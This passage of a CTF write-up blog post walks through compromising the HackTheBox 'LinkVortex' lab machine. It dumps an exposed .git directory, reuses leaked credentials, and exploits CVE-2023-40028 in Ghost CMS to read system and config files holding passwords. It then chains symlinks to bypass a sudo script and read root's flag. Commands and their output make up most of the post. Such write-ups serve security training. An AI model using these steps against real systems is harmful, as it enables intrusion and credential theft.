http://dev.linkvortex.htb/.git/objects/50/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]</span><br><span class="line">[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]</span><br><span class="line">[-] Sanitizing .git/config</span><br><span class="line">[-] Running git checkout .</span><br><span class="line">Updated 5596 paths from the index</span><br></pre></td></tr></table></figure></div>
+
+<p>NOTE: we can install <code>git-dumper</code> with a simple <code>pip install git-dumper</code> .</p>
+<p>Looking at the <code>ghost/core/test/regression/api/admin/authentication.test.js</code> file inside our dumped .git folder, we find interesting credentials:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> email = <span class="string">&#x27;test@example.com&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> password = <span class="string">&#x27;OctopiFociPilfer45&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can now try those credentials over at <a class="link"   target="_blank" rel="noopener" href="http://linkvortex.htb/ghost/#/signin" >http://linkvortex.htb/ghost/#/signin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> using the <code>admin@linkvortex.htb</code> email:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/LinkVortex/web2.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>And we’re in!</p>
+<h4 id="CVE-2023-40028-Symlink-file-upload-to-arbitrary-file-read"><a href="#CVE-2023-40028-Symlink-file-upload-to-arbitrary-file-read" class="headerlink" title="CVE-2023-40028 - Symlink file upload to arbitrary file read"></a>CVE-2023-40028 - Symlink file upload to arbitrary file read</h4><p>From the dumper .git directory, we can check the <code>Ghost</code> CMS version:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line"></span><br><span class="line">    repositoryformatversion = 0</span><br><span class="line"></span><br><span class="line">    filemode = true</span><br><span class="line"></span><br><span class="line">    bare = false</span><br><span class="line"></span><br><span class="line">    logallrefupdates = true</span><br><span class="line"></span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line"></span><br><span class="line">    url = https://github.com/TryGhost/Ghost.git</span><br><span class="line"></span><br><span class="line">    fetch = +refs/tags/v5.58.0:refs/tags/v5.58.0</span><br></pre></td></tr></table></figure></div>
+
+<p>Looking for CVEs for this version we stumble upon <a class="link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-40028" >CVE-2023-40028 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> which is a symlink file upload that leads to arbitrary file read, allowing us to read files from system.</p>
+<p>We can use <a class="link"   target="_blank" rel="noopener" href="https://github.com/0xyassine/CVE-2023-40028" >this amazing POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for exploiting the vulnerbility:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~/CVE-2023-40028$ ./CVE-2023-40028.sh -u <span class="string">&quot;admin@linkvortex.htb&quot;</span> -p OctopiFociPilfer45</span><br><span class="line">WELCOME TO THE CVE-2023-40028 SHELL</span><br><span class="line">file&gt; /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">node:x:1000:1000::/home/node:/bin/bash</span><br></pre></td></tr></table></figure></div>
+
+<p>And we got it!</p>
+<p>Looking at the <code>Dockerfile.ghost</code> dockerfile from the dumped git folder, we find an interesting config file:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">FROM ghost:5.58.0</span><br><span class="line"></span><br><span class="line"># Copy the config</span><br><span class="line">COPY config.production.json /var/lib/ghost/config.production.json</span><br><span class="line"></span><br><span class="line"># Prevent installing packages</span><br><span class="line">RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb</span><br><span class="line"></span><br><span class="line"># Wait for the db to be ready first</span><br><span class="line">COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh</span><br><span class="line">COPY entry.sh /entry.sh</span><br><span class="line">RUN chmod +x /var/lib/ghost/wait-for-it.sh</span><br><span class="line">RUN chmod +x /entry.sh</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [&quot;/entry.sh&quot;]</span><br><span class="line">CMD [&quot;node&quot;, &quot;current/index.js&quot;]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s read it using the LFI vulnerability:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">file&gt; /var/lib/ghost/config.production.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://localhost:2368&quot;</span>,</span><br><span class="line">  <span class="string">&quot;server&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;port&quot;</span>: 2368,</span><br><span class="line">    <span class="string">&quot;host&quot;</span>: <span class="string">&quot;::&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;mail&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;Direct&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;logging&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;transports&quot;</span>: [<span class="string">&quot;stdout&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;process&quot;</span>: <span class="string">&quot;systemd&quot;</span>,</span><br><span class="line">  <span class="string">&quot;paths&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;contentPath&quot;</span>: <span class="string">&quot;/var/lib/ghost/content&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;spam&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;user_login&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;minWait&quot;</span>: 1,</span><br><span class="line">        <span class="string">&quot;maxWait&quot;</span>: 604800000,</span><br><span class="line">        <span class="string">&quot;freeRetries&quot;</span>: 5000</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;mail&quot;</span>: &#123;</span><br><span class="line">     <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;SMTP&quot;</span>,</span><br><span class="line">     <span class="string">&quot;options&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;service&quot;</span>: <span class="string">&quot;Google&quot;</span>,</span><br><span class="line">      <span class="string">&quot;host&quot;</span>: <span class="string">&quot;linkvortex.htb&quot;</span>,</span><br><span class="line">      <span class="string">&quot;port&quot;</span>: 587,</span><br><span class="line">      <span class="string">&quot;auth&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: <span class="string">&quot;bob@linkvortex.htb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;fibber-talented-worth&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>And we get some new credentials for user bob: <code>bob:fibber-talented-worth</code>.</p>
+<p>We try those directly for ssh access and we’re in:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(bob) gid=1001(bob) <span class="built_in">groups</span>=1001(bob)</span><br><span class="line">bob@linkvortex:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">126087d0d4376ec5c2c889be92695e37</span><br><span class="line">bob@linkvortex:~$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-Symlink-abuse"><a href="#Privilege-Escalation-Symlink-abuse" class="headerlink" title="Privilege Escalation - Symlink abuse"></a>Privilege Escalation - Symlink abuse</h3><p>Looking at what bob can execute as sudo:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> bob on linkvortex:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty, env_keep+=CHECK_CONTENT</span><br><span class="line"></span><br><span class="line">User bob may run the following commands on linkvortex:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that he can run the <code>/opt/ghost/clean_symlink.sh</code> script as root.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">cat</span> /opt/ghost/clean_symlink.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">QUAR_DIR=<span class="string">&quot;/var/quarantined&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$CHECK_CONTENT</span> ];<span class="keyword">then</span></span><br><span class="line">  CHECK_CONTENT=<span class="literal">false</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">LINK=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! [[ <span class="string">&quot;<span class="variable">$LINK</span>&quot;</span> =~ \.png$ ]]; <span class="keyword">then</span></span><br><span class="line">  /usr/bin/echo <span class="string">&quot;! First argument must be a png file !&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> /usr/bin/sudo /usr/bin/test -L <span class="variable">$LINK</span>;<span class="keyword">then</span></span><br><span class="line">  LINK_NAME=$(/usr/bin/basename <span class="variable">$LINK</span>)</span><br><span class="line">  LINK_TARGET=$(/usr/bin/readlink <span class="variable">$LINK</span>)</span><br><span class="line">  <span class="keyword">if</span> /usr/bin/echo <span class="string">&quot;<span class="variable">$LINK_TARGET</span>&quot;</span> | /usr/bin/grep -Eq <span class="string">&#x27;(etc|root)&#x27;</span>;<span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;! Trying to read critical files, removing link [ <span class="variable">$LINK</span> ] !&quot;</span></span><br><span class="line">    /usr/bin/unlink <span class="variable">$LINK</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Link found [ <span class="variable">$LINK</span> ] , moving it to quarantine&quot;</span></span><br><span class="line">    /usr/bin/mv <span class="variable">$LINK</span> <span class="variable">$QUAR_DIR</span>/</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$CHECK_CONTENT</span>;<span class="keyword">then</span></span><br><span class="line">      /usr/bin/echo <span class="string">&quot;Content:&quot;</span></span><br><span class="line">      /usr/bin/cat <span class="variable">$QUAR_DIR</span>/<span class="variable">$LINK_NAME</span> 2&gt;/dev/null</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></div>
+
+<p>This script checks if the provided argument is a symbolic link to a .png file, and if the link points to a sensitive directory like &#x2F;etc or &#x2F;root, it deletes it; otherwise, it moves the link to a quarantine directory. Optionally, if CHECK_CONTENT is set to true, it displays the content of the quarantined file.</p>
+<p>What we can do in this case is chain a couple of symlinks without triggering the check for <code>etc</code> and <code>root</code> by first symlinking <code>/root/root.txt</code> to <code>/home/bob/kujen.txt</code> and then linking <code>/home/bob/kujen.txt</code> to <code>/home/bob/kujen.png</code> and execute the script on it to read the root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /root/root.txt /home/bob/kujen.txt</span><br><span class="line">bob@linkvortex:~$ <span class="built_in">ln</span> -s /home/bob/kujen.txt /home/bob/kujen.png</span><br><span class="line">bob@linkvortex:~$ sudo CHECK_CONTENT=<span class="literal">true</span> /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/kujen.png</span><br><span class="line">Link found [ /home/bob/kujen.png ] , moving it to quarantine</span><br><span class="line">Content:</span><br><span class="line">83408dc875c41a3c60b0927b00b621bb</span><br><span class="line">bob@linkvortex:~$</span><br></pre></td></tr></table></figure></div>
+
+
+<p>And we got our root flag: <code>83408dc875c41a3c60b0927b00b621bb</code>.<br>That was it for LinkVortex! Hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: LinkVortex</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-04-11 10:41:04</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-04-11 12:25:40
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/04/11/Hackthebox-LinkVortex/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/04/03/Hackthebox-Ghost/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Ghost</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: LinkVortex</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-linkvortex-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;linkvortex.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-dev-linkvortex-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;dev.linkvortex.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-Symlink-abuse"><span class="nav-text">Privilege Escalation - Symlink abuse</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
